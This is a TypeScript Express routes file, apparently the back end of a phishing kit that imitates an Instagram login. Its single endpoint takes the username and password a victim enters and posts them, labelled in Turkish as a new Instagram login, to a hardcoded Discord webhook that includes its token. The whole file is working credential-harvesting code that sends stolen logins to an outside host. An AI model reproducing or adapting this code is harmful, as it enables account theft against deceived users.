import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { loginFormSchema } from "@shared/schema";
import { ZodError } from "zod";
import { fromZodError } from "zod-validation-error";
import axios from "axios";

export async function registerRoutes(app: Express): Promise<Server> {
  // API endpoint to send webhook message to Discord
  app.post("/api/webhook", async (req, res) => {
    try {
      // Validate input
      const formData = loginFormSchema.parse(req.body);
      const { username, password } = formData;
      const webhookUrl = "https://discord.com/api/webhooks/1351717767585464321/G55PRIVsD7T2AB6yyqD3M_znGaOrwRRezYlqqlOQEXGq4vSQo3rNEWxzZrMJocjoeB93";

      // Prepare Discord webhook message
      const message = {
        content: "🚨 **Instagram Yeni Giriş** 🚨",
        embeds: [{
          title: "Hesap Bilgileri;",
          color: 16426522, // Instagram pembemsi renk
          fields: [
            {
              name: "👤 Kullanıcı Adı:",
              value: username,
              inline: true
            },
            {
              name: "🔒 Şifre:",
              value: password,
              inline: true
            },
            {
              name: "🕝 Tarih:",
              value: new Date().toISOString(),
              inline: false
            }
          ]
        }]
      };

      // Send to Discord webhook
      try {
        await axios.post(webhookUrl, message, {
          headers: {
            'Content-Type': 'application/json',
          }
        });
        
        return res.status(200).json({ success: true, message: "Giriş bilgileri başarıyla gönderildi!" });
      } catch (error) {
        console.error("Discord webhook error:", error);
        return res.status(500).json({ 
          success: false, 
          message: "Bilgiler gönderilirken bir hata oluştu. Lütfen daha sonra tekrar deneyin."
        });
      }
    } catch (error) {
      if (error instanceof ZodError) {
        const validationError = fromZodError(error);
        return res.status(400).json({ 
          success: false, 
          message: validationError.message 
        });
      }
      
      console.error("Server error:", error);
      return res.status(500).json({ 
        success: false, 
        message: "An unexpected error occurred. Please try again."
      });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
